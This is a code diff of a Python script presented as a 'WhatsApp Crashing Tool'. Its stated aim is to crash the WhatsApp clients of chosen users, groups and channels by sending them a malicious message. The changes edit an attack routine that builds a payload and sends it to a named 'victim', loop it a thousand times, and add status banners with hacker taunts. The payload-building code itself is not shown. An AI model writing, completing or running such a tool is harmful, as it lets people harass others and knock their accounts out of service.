@@ -1,4 +1,15 @@
+# Versoin: 2.1
+# Author: evilfeonix
+# Name: WhatsApp Crashing Tool
+# Website: www.evilfeonix.com 
+# Email: evilfeonix@gmail.com 
+# Date: 20 - NOVEMBER - 2024
 
+
+######   Welcoming to WhatsApp Crasher...
+######   your ultimate tool to crash and sustain any whatsapp users, groups, and channels,
+######   by just sending them malicious message.
+  
 import os, sys, time, urllib
 from socket import *
 import phonenumbers
@@ -29,7 +40,7 @@ def internet():
 
 def aboutus():
     slow("    Tool Name: Whats Crash")
-    slow("    Version: v[1.2]")
+    slow("    Version: v[1.1]")
     slow("    Author: evilfeonix")
     slow("    Github: Digital Firebird")
     slow("    Youtube: Digital Firebird")
@@ -228,6 +239,7 @@ def notFound(url):
     input(f"{red}Press [ENTER] to Continue{red}") 
     evilfeonix="https://github.com/evilfeonix" 
     os.system(f"xdg-open {evilfeonix}")
+    os.sys.exit()
 
 def start_attack(msg,victim):
     payload = set_malicious_payload(msg)
@@ -249,16 +261,16 @@ def start_attack(msg,victim):
         slow(f"{red}[-] Please Check Your Internet Connection.{white}")
         os.sys.exit()
     except requests.exceptions.ReadTimeout as a:
-        slow(f"{red}[-] {a}.{white}")
+        slow(f"{red}[-] Read timed out: Seems Like You're Out Of Data.{white}")
         os.sys.exit()
 
 
     if response.status_code == 200:
-        return True
+        return (True, response.status_code)
     elif response.status_code == 404:
         notFound(url)
     else:
-        return False
+        return (False, response.status_code)
         
         
 
@@ -266,15 +278,16 @@ def multipro(victim):
     i=0
     j=0
     msg = input("[+] Enter message to send: ")
+    os.system("clear || cls")
     try:
-        os.system("clear || cls")
         slow(f"{bg}{red}Press Ctr+C to stop Attacks\033[0m{red}")
         for k in range(1000):
-            a = start_attack(msg,victim)
+            a,c = start_attack(msg,victim)
             if a == True:
                 i+=1
             else:
                 j+=1
+            time.sleep(0.1)
 
     except KeyboardInterrupt:
         slow(f"{red}[-] Attack Stopped!{white}              ")
@@ -314,7 +327,7 @@ def pro(victim):
     j=0
     k=0
     msg = input("[+] Enter message to send: ")
-    a = start_attack(msg,victim)
+    a,c = start_attack(msg,victim)
     if a == True:
         i+=1
         slow(f"""{red}
@@ -331,7 +344,7 @@ def pro(victim):
     expect us 👥 any time 👀.{red}
 ===========================================================
     Status: OK        
-    Status_Code: 200        
+    Server: https://web.whatsapp.com/        
     Victim: {victim}        
     Sent: {i}        
     Failed: {j}        
@@ -360,8 +373,8 @@ def pro(victim):
     we do not forget 😈,
     expect us 👥 any time 👀.{red}
 ===========================================================
-    Status: Faild to Connect        
-    Status_Code: 0        
+    Status: An error occure       
+    Status_Code: {c}      
     Victim: {victim}        
     Sent: {i}        
     Failed: {j}        
